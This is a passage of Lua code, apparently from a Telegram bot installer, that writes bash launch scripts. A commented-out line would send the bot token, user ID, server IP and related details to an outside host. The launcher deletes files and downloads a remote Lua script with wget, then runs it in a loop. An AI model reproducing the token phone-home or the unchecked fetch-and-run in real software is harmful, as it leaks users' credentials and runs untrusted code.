...
--- local t = json:decode(https.request("https://centersgame.xyz/PhiladelphiaSource/index1.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("Louisville", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Louisville
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Louisville.lua
wget "https://raw.githubusercontent.com/LouisvilleTEAM/Louisville/master/Louisville.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Louisville.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Louisville -X kill
screen -S Louisville ./Louisville
done
]])
RunTs:close()
end
